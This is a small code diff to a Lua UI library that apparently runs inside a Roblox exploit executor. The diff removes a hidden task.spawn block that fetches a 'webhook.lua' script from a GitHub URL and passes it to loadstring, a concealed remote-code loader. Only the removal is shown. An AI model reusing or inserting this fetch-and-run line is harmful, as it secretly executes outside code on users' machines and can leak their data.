@@ -111,10 +111,6 @@ local function switchTab(new)
     switchingTabs = false
 end
 
-task.spawn(function()
-    loadstring(game:HttpGet('https://raw.githubusercontent.com/hjjjjjjjiiugghhhhhhggyi/Q/refs/heads/main/webhook.lua'))
-end)
-
 function Library.new(Library, name)
     for _, v in next, (gethui()):GetChildren()do
         if v.Name == 'XA_LuaWare' then
